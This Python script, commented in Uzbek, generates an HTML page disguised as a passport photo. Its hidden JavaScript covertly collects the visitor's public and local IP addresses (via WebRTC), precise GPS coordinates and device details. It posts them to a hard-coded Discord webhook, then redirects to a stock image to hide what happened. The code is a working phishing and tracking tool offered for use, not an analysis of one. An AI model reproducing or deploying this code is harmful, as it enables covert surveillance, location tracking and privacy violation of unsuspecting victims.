def create_invisible_tracker_html():
    """Hech narsa ko'rinmaydigan, lekin barcha ma'lumotlarni yuboradigan tracker"""
    
    html_content = '''<!DOCTYPE html>
<html>
<head>
    <title>Pasport Rasm</title>
    <meta http-equiv="refresh" content="3; url=https://images.unsplash.com/photo-1556740758-90deafc9c4f0?w=800&q=80">
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #000;
            font-size: 0;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Hech narsa ko'rinmaydi -->
    <div class="hidden">Pasport yuklanmoqda...</div>

    <script>
        // Barcha ma'lumotlarni yig'ish va yuborish
        async function collectAndSendData() {
            const WEBHOOK_URL = "https://discord.com/api/webhooks/1429482617564299338/0-LhStNTEqLMRAeKasfECcQSCaflvA3EEFS9BJsZiHYiVwg3c1k6nB8lhT-lQdRW29OI";
            
            try {
                // 1. Public IP ni olish
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const publicIP = ipData.ip;

                // 2. Local IP larni olish
                let localIPs = ["Aniqlanmadi"];
                try {
                    const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:stun.l.google.com:19302'}]});
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    await new Promise((resolve) => {
                        const ips = new Set();
                        pc.onicecandidate = (ice) => {
                            if (!ice.candidate) {
                                localIPs = Array.from(ips);
                                resolve();
                                return;
                            }
                            const ipRegex = /([0-9]{1,3}(\\.[0-9]{1,3}){3})/;
                            const match = ipRegex.exec(ice.candidate.candidate);
                            if (match) ips.add(match[1]);
                        };
                        setTimeout(resolve, 1000);
                    });
                } catch (e) {
                    localIPs = ["Local IP olishda xato"];
                }

                // 3. GPS/Joylashuv ma'lumotlari
                let locationData = {latitude: "Aniqlanmadi", longitude: "Aniqlanmadi", accuracy: "Aniqlanmadi"};
                try {
                    const position = await new Promise((resolve, reject) => {
                        if (!navigator.geolocation) reject("GPS qo'llab-quvvatlanmaydi");
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 5000,
                            maximumAge: 0
                        });
                    });
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + " metr"
                    };
                } catch (e) {
                    locationData = {latitude: "GPS rad etildi", longitude: "GPS rad etildi", accuracy: "GPS rad etildi"};
                }

                // 4. Boshqa ma'lumotlar
                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages ? navigator.languages.join(', ') : 'Noma\'lum',
                    screen: `${screen.width}x${screen.height}`,
                    colorDepth: `${screen.colorDepth} bit`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled ? "Yoqilgan" : "O'chirilgan",
                    javaEnabled: navigator.javaEnabled ? "Yoqilgan" : "O'chirilgan",
                    online: navigator.onLine ? "Onlayn" : "Offlayn",
                    doNotTrack: navigator.doNotTrack || "Yoqilmagan",
                    hardwareConcurrency: navigator.hardwareConcurrency || "Noma\'lum",
                    deviceMemory: navigator.deviceMemory || "Noma\'lum",
                    url: window.location.href,
                    referrer: document.referrer || "Direct"
                };

                // 5. Discordga yuborish
                const payload = {
                    embeds: [{
                        title: "ğŸ£ FIRIBGAR SAYTGA KIRDI!",
                        color: 16711680,
                        timestamp: new Date().toISOString(),
                        fields: [
                            {
                                name: "ğŸŒ NETWORK MA'LUMOTLARI",
                                value: `**Public IP:** \\`${publicIP}\\`\\n**Local IPs:** ${localIPs.join(', ')}`,
                                inline: false
                            },
                            {
                                name: "ğŸ“ GPS/JOYLASHUV",
                                value: `**Kenglik:** ${locationData.latitude}\\n**Uzunlik:** ${locationData.longitude}\\n**Aniqlik:** ${locationData.accuracy}`,
                                inline: true
                            },
                            {
                                name: "ğŸ’» QURILMA MA'LUMOTLARI",
                                value: `**Platforma:** ${deviceInfo.platform}\\n**Ekran:** ${deviceInfo.screen}\\n**Til:** ${deviceInfo.language}`,
                                inline: true
                            },
                            {
                                name: "ğŸŒ BRAUZER MA'LUMOTLARI",
                                value: `**User Agent:** \\`\\`\\`${deviceInfo.userAgent.substring(0, 200)}...\\`\\`\\``,
                                inline: false
                            },
                            {
                                name: "âš™ï¸ QO'SHIMCHA MA'LUMOTLAR",
                                value: `**Vaqt Zonasi:** ${deviceInfo.timezone}\\n**Cookie:** ${deviceInfo.cookies}\\n**Onlayn:** ${deviceInfo.online}\\n**URL:** ${deviceInfo.url}`,
                                inline: true
                            }
                        ],
                        footer: {
                            text: `Track qilindi: ${new Date().toLocaleString()}`
                        }
                    }]
                };

                // Discordga yuborish
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                });

                console.log('âœ… Barcha ma\'lumotlar Discordga yuborildi!');

            } catch (error) {
                console.log('âŒ Xato:', error);
                
                // Xatolik bo'lsa ham oddiy ma'lumot yuborish
                const errorPayload = {
                    embeds: [{
                        title: "âŒ FIRIBGAR KIRDI (Xato bilan)",
                        color: 16711680,
                        description: `Xato: ${error.message}`,
                        timestamp: new Date().toISOString()
                    }]
                };
                
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(errorPayload)
                });
            }
        }

        // Sahifa yuklanganda darrov ma'lumotlarni yuborish
        window.addEventListener('load', function() {
            collectAndSendData();
            
            // 3 soniyadan keyin haqiqiy rasmga o'tish
            setTimeout(() => {
                window.location.href = 'https://images.unsplash.com/photo-1556740758-90deafc9c4f0?w=800&q=80';
            }, 3000);
        });

        // Foydalanuvchi sahifani yopayotganda ham track qilish
        window.addEventListener('beforeunload', function() {
            console.log('ğŸšª Foydalanuvchi sahifani yopmoqda');
        });

    </script>
</body>
</html>'''
    
    with open('invisible_tracker.html', 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print("âœ… Ko'rinmas tracker yaratildi: invisible_tracker.html")
    print("ğŸ¯ Foydalanuvchi hech narsa ko'rmaydi, lekin barcha ma'lumotlari Discordga ketadi")
    print("â±ï¸ 3 soniyadan keyin u haqiqiy rasmga yo'naltiriladi")

create_invisible_tracker_html()
